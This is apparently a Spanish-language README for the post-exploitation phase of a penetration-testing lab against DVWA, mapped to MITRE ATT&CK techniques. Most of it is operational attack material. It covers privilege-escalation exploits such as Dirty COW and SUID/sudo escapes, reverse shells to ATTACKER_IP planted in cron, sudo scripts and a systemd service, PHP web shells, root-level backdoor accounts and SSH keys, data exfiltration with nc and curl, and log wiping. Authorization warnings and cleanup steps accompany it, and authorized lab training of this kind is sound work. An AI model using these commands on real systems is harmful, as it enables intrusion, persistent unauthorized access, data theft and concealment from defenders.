# Fase de Post-Explotación

**MITRE ATT&CK**: T1068 (Privilege Escalation), T1053 (Scheduled Task/Job), T1543 (Create or Modify System Process)

## Objetivo

Una vez obtenido acceso inicial al sistema, esta fase se enfoca en:
- Mantener el acceso (persistencia)
- Escalar privilegios
- Movimiento lateral (si aplica)
- Recolección de información adicional
- Limpieza de rastros

## Subdirectorios

```
05-Post-Explotacion/
├── README.md                  # Este archivo
├── privilege-escalation/      # Scripts y técnicas de escalada
└── persistence/               # Mecanismos de persistencia
```

## ⚠️ ADVERTENCIA

**Estas técnicas son SOLO para entornos autorizados**. El objetivo educativo es entender los riesgos completos de una vulnerabilidad inicial.

## Técnicas MITRE ATT&CK Aplicables

| ID | Técnica | Descripción |
|----|---------|-------------|
| T1068 | Exploitation for Privilege Escalation | Escalada de privilegios |
| T1053 | Scheduled Task/Job | Tareas programadas |
| T1543 | Create or Modify System Process | Modificar procesos del sistema |
| T1136 | Create Account | Crear cuentas de usuario |
| T1098 | Account Manipulation | Manipulación de cuentas |
| T1505.003 | Web Shell | Mantener web shell |
| T1574 | Hijack Execution Flow | Secuestro de ejecución |
| T1070 | Indicator Removal | Limpiar rastros |

## 1. Reconocimiento Post-Explotación

### 1.1. Información del Sistema

Una vez obtenido shell (via command injection o web shell):

```bash
# Información básica del sistema
uname -a                    # Kernel version
cat /etc/*-release         # Distribución Linux
hostname                   # Nombre del host
whoami                     # Usuario actual
id                         # UID, GID, grupos
pwd                        # Directorio actual

# Información de red
ifconfig -a                # Interfaces de red
ip addr                    # Direcciones IP
netstat -tuln              # Puertos abiertos
ss -tuln                   # Alternativa a netstat

# Procesos en ejecución
ps aux                     # Todos los procesos
ps aux | grep root         # Procesos como root
top -n 1                   # Vista rápida de procesos
```

**Mapeo ATT&CK**: T1082 (System Information Discovery)

### 1.2. Enumeración de Usuarios

```bash
# Listar usuarios
cat /etc/passwd

# Usuarios con shell
cat /etc/passwd | grep -v "nologin\|false"

# Usuarios con UID > 1000 (usuarios normales)
awk -F: '$3 >= 1000 {print $1}' /etc/passwd

# Usuarios con privilegios sudo
cat /etc/group | grep sudo

# Historial de comandos
cat ~/.bash_history
cat /home/*/.bash_history
```

**Mapeo ATT&CK**: T1087 (Account Discovery)

### 1.3. Archivos y Directorios Interesantes

```bash
# Archivos con permisos SUID
find / -perm -4000 -type f 2>/dev/null

# Archivos escribibles por cualquiera
find / -writable -type f 2>/dev/null | grep -v proc

# Archivos de configuración
ls -la /etc/apache2/
ls -la /etc/mysql/
ls -la /var/www/html/config/

# Archivos con passwords
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "pwd" /var/www/html/ 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

**Mapeo ATT&CK**: T1083 (File and Directory Discovery)

### 1.4. Servicios y Cron Jobs

```bash
# Servicios en ejecución
systemctl list-units --type=service --state=running

# Cron jobs
crontab -l                 # Cron del usuario actual
cat /etc/crontab           # Cron del sistema
ls -la /etc/cron.*         # Directorios de cron

# Timers de systemd
systemctl list-timers
```

## 2. Escalada de Privilegios

### 2.1. Kernel Exploits

```bash
# Verificar versión del kernel
uname -r

# Buscar exploits conocidos
searchsploit linux kernel $(uname -r)

# Exploits comunes para kernels antiguos:
# - Dirty COW (CVE-2016-5195)
# - Ubuntu Overlayfs (CVE-2015-1328)
# - RDS (CVE-2010-3904)
```

**Ejemplo: Dirty COW** (SOLO si kernel es vulnerable):
```bash
# Descargar exploit
wget https://github.com/firefart/dirtycow/raw/master/dirty.c

# Compilar
gcc -pthread dirty.c -o dirty -lcrypt

# Ejecutar (CUIDADO: puede corromper el sistema)
./dirty password

# Obtener shell root
su firefart
# password: password
```

**Mapeo ATT&CK**: T1068 (Exploitation for Privilege Escalation)

### 2.2. Escalada via SUID Binaries

**Buscar binarios SUID**:
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Explotar binarios comunes**:

**Si `find` tiene SUID**:
```bash
find . -exec /bin/sh -p \; -quit
```

**Si `vim` tiene SUID**:
```bash
vim -c ':!/bin/sh'
```

**Si `nmap` tiene SUID** (versiones antiguas):
```bash
nmap --interactive
!sh
```

**Si `python` tiene SUID**:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### 2.3. Escalada via Sudo Misconfiguration

**Verificar permisos sudo**:
```bash
sudo -l
```

**Ejemplos de explotación**:

**Si puede ejecutar `/bin/bash` con sudo**:
```bash
sudo /bin/bash
```

**Si puede ejecutar `vim` con sudo**:
```bash
sudo vim -c ':!/bin/sh'
```

**Si puede ejecutar scripts sin password**:
```bash
# Si: (ALL) NOPASSWD: /path/to/script.sh
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/script.sh
sudo /path/to/script.sh
```

**Mapeo ATT&CK**: T1548.003 (Sudo and Sudo Caching)

### 2.4. Escalada via Cron Jobs

**Buscar cron jobs con permisos débiles**:
```bash
# Listar cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Buscar scripts ejecutados por root que sean escribibles
for dir in /etc/cron.*; do
    find $dir -type f -writable 2>/dev/null
done
```

**Explotación**:
```bash
# Si un script de cron es escribible
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/cron-script.sh

# Esperar a que se ejecute
# Obtendrás shell como root
```

**Mapeo ATT&CK**: T1053.003 (Cron)

### 2.5. Herramientas de Enumeración Automática

**LinPEAS** (Linux Privilege Escalation Awesome Script):
```bash
# Descargar
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Ejecutar
chmod +x linpeas.sh
./linpeas.sh | tee privilege-escalation/linpeas-output.txt
```

**Linux Smart Enumeration (LSE)**:
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh -l2 | tee privilege-escalation/lse-output.txt
```

**pspy** (Monitor de procesos sin root):
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

## 3. Persistencia

### 3.1. Web Shell Persistente

**Mejorar web shell existente**:
```php
<?php
// Guardar en: /var/www/html/.hidden-shell.php
set_time_limit(0);
error_reporting(0);

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    // Ejecutar comando
    $output = shell_exec($cmd . " 2>&1");

    // Log de actividad
    file_put_contents('/tmp/.shell.log',
        date('Y-m-d H:i:s') . " - " . $cmd . "\n",
        FILE_APPEND);

    echo "<pre>$output</pre>";
}
?>
```

**Web shell con password**:
```php
<?php
// Password-protected shell
$password = "SecretPass123";

if(isset($_POST['pass']) && $_POST['pass'] === $password) {
    if(isset($_POST['cmd'])) {
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }

    // Form
    echo '<form method="post">
            <input type="hidden" name="pass" value="' . $password . '">
            <input name="cmd" autofocus>
            <input type="submit">
          </form>';
} else if(isset($_POST['pass'])) {
    echo "Invalid password";
} else {
    echo '<form method="post">
            <input type="password" name="pass" placeholder="Password">
            <input type="submit">
          </form>';
}
?>
```

**Mapeo ATT&CK**: T1505.003 (Web Shell)

### 3.2. Backdoor User Account

**Crear usuario backdoor**:
```bash
# Crear usuario con UID 0 (root)
useradd -ou 0 -g 0 backdoor
echo "backdoor:password123" | chpasswd

# O agregar directamente a /etc/passwd
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd
echo "backdoor:password123" | chpasswd
```

**Agregar usuario a sudoers**:
```bash
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

**Mapeo ATT&CK**: T1136.001 (Create Account: Local Account)

### 3.3. SSH Backdoor

**Agregar clave SSH autorizada**:
```bash
# Generar par de claves (en tu máquina)
ssh-keygen -t rsa -b 4096 -f backdoor_key

# Copiar clave pública al servidor
mkdir -p /root/.ssh
echo "TU_CLAVE_PUBLICA" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Conectar
ssh -i backdoor_key root@target
```

**Modificar configuración SSH para permitir root login**:
```bash
# Editar /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
service sshd restart
```

**Mapeo ATT&CK**: T1098.004 (SSH Authorized Keys)

### 3.4. Cron Job Backdoor

```bash
# Backdoor que se ejecuta cada 5 minutos
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab

# O guardar script en cron.d
cat > /etc/cron.d/backdoor << 'EOF'
*/5 * * * * root /usr/local/bin/.backdoor.sh
EOF

# Script de backdoor
cat > /usr/local/bin/.backdoor.sh << 'EOF'
#!/bin/bash
# Intentar conectar cada 5 minutos
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /usr/local/bin/.backdoor.sh
```

**Mapeo ATT&CK**: T1053.003 (Scheduled Task/Job: Cron)

### 3.5. Systemd Service Backdoor

```bash
# Crear servicio de systemd
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Background Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 300; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Habilitar y iniciar
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

**Mapeo ATT&CK**: T1543.002 (Create or Modify System Process: Systemd Service)

## 4. Movimiento Lateral

### 4.1. Enumeración de Red Interna

```bash
# Hosts activos en la red
nmap -sn 172.20.0.0/16

# Escaneo de puertos de hosts internos
nmap -p- 172.20.0.2

# ARP scan
arp -a
```

### 4.2. Pivoting con SSH

```bash
# SSH tunneling (local port forward)
ssh -L 8080:internal-server:80 user@compromised-host

# Dynamic port forward (SOCKS proxy)
ssh -D 9050 user@compromised-host
# Configurar proxychains para usar 127.0.0.1:9050
```

**Mapeo ATT&CK**: T1021.004 (Remote Services: SSH)

### 4.3. Pass-the-Hash (en entornos Windows)

Para DVWA en Docker (Linux), no aplica directamente, pero el concepto es importante.

## 5. Recolección de Datos Sensibles

### 5.1. Bases de Datos

```bash
# Conectar a MySQL
mysql -u dvwa -pdvwa_password dvwa

# Dentro de MySQL:
SHOW DATABASES;
USE dvwa;
SHOW TABLES;
SELECT * FROM users;

# Exportar base de datos
mysqldump -u dvwa -pdvwa_password dvwa > privilege-escalation/database-dump.sql
```

**Mapeo ATT&CK**: T1213 (Data from Information Repositories)

### 5.2. Archivos de Configuración

```bash
# Archivos de configuración web
cat /var/www/html/config/config.inc.php

# Passwords en archivos de configuración
grep -r "password\|pwd\|passwd" /var/www/html/

# Variables de entorno
env | grep -i "pass\|key\|secret\|token"

# Archivos de configuración del sistema
cat /etc/apache2/apache2.conf
cat /etc/mysql/my.cnf
```

### 5.3. Exfiltración de Datos

```bash
# Via netcat
tar czf - /var/www/html/ | nc ATTACKER_IP 5555

# Via HTTP
curl -X POST -F "file=@database-dump.sql" http://ATTACKER_IP:8000/upload

# Via base64 en output
tar czf - /var/www/html/ | base64
# Copiar y decodificar en tu máquina
```

**Mapeo ATT&CK**: T1041 (Exfiltration Over C2 Channel)

## 6. Limpieza de Rastros

### 6.1. Logs del Sistema

```bash
# Limpiar logs de comandos
history -c
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# Limpiar logs del sistema (requiere root)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Eliminar líneas específicas de logs
sed -i '/attacker_ip/d' /var/log/apache2/access.log
```

**Mapeo ATT&CK**: T1070.002 (Clear Linux or Mac System Logs)

### 6.2. Limpiar Archivos Temporales

```bash
# Eliminar shells y backdoors
rm /var/www/html/hackable/uploads/shell.php
rm /tmp/.backdoor.sh

# Eliminar herramientas subidas
rm /tmp/linpeas.sh
rm /tmp/pspy64
```

### 6.3. Restaurar Configuraciones

```bash
# Si modificaste crontab
crontab -r

# Si modificaste sudoers
# Restaurar /etc/sudoers.bak

# Si creaste usuarios
userdel -r backdoor
```

## 7. Documentación de Post-Explotación

### 7.1. Captura de Evidencias

```bash
# Capturar screenshots de escalada exitosa
bash ../07-Scripts/capture-evidence.sh --screenshot postexp privesc "root-shell" T1068

# Capturar evidencia de persistencia
bash ../07-Scripts/capture-evidence.sh --screenshot postexp persist "backdoor-created" T1543

# Guardar outputs
whoami > privilege-escalation/whoami-output.txt
id > privilege-escalation/id-output.txt
```

### 7.2. Plantilla de Documentación

```markdown
## Post-Explotación: [Técnica]

**Fecha**: YYYY-MM-DD HH:MM
**Técnica ATT&CK**: TXXXX
**Usuario inicial**: [usuario]
**Usuario final**: [usuario después de escalada]

### Técnica Utilizada
[Descripción de la técnica]

### Comandos Ejecutados
```bash
[comandos completos]
```

### Resultado
[Qué se logró]

### Evidencias
- Screenshot: `XXX_postexp_technique_description.png`
- Output: `XXX_postexp_output.txt`

### Impacto
[Impacto de la técnica]

### Detección
[Cómo se puede detectar]

### Mitigación
[Cómo prevenir]
```

## 8. Consideraciones Éticas

### 8.1. En Entorno de Producción REAL

**SI tienes autorización**:
- ✅ Documenta TODO
- ✅ Coordina con el equipo
- ✅ NO hagas cambios permanentes sin aprobación
- ✅ Ten plan de rollback
- ✅ Limpia TODOS los backdoors al finalizar

**NUNCA**:
- ❌ Dejes backdoors en sistemas de producción
- ❌ Extraigas datos reales sin autorización
- ❌ Causes daño o interrupciones
- ❌ Compartas credenciales obtenidas

## 9. Próximos Pasos

Después de completar post-explotación:

1. ✅ Todas las técnicas documentadas
2. ✅ Evidencias capturadas
3. ✅ Persistencia demostrada (y removida)
4. ✅ Escalada de privilegios documentada
5. ✅ Sistema limpio de backdoors
6. ✅ Proceder con **Generación de Informe**:

```bash
cd ../08-Informe
bash ../07-Scripts/generar-informe.sh
```

## 10. Referencias

- **MITRE ATT&CK - Privilege Escalation**: https://attack.mitre.org/tactics/TA0004/
- **LinPEAS**: https://github.com/carlospolop/PEASS-ng
- **GTFOBins**: https://gtfobins.github.io/
- **PayloadsAllTheThings - Linux Privesc**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- **HackTricks**: https://book.hacktricks.xyz/linux-hardening/privilege-escalation

## 11. Checklist

- [ ] Reconocimiento post-explotación completado
- [ ] Enumeración de usuarios y grupos
- [ ] Archivos SUID identificados
- [ ] Escalada de privilegios ejecutada
- [ ] Root shell obtenido
- [ ] Persistencia implementada (y documentada)
- [ ] Movimiento lateral explorado
- [ ] Datos sensibles recolectados
- [ ] Base de datos exportada
- [ ] Todas las evidencias capturadas
- [ ] Documentación completa
- [ ] Limpieza de rastros realizada
- [ ] Backdoors removidos (importante!)

---

**Última actualización**: 2024-12-03
**Fase siguiente**: Generación de Informe Final
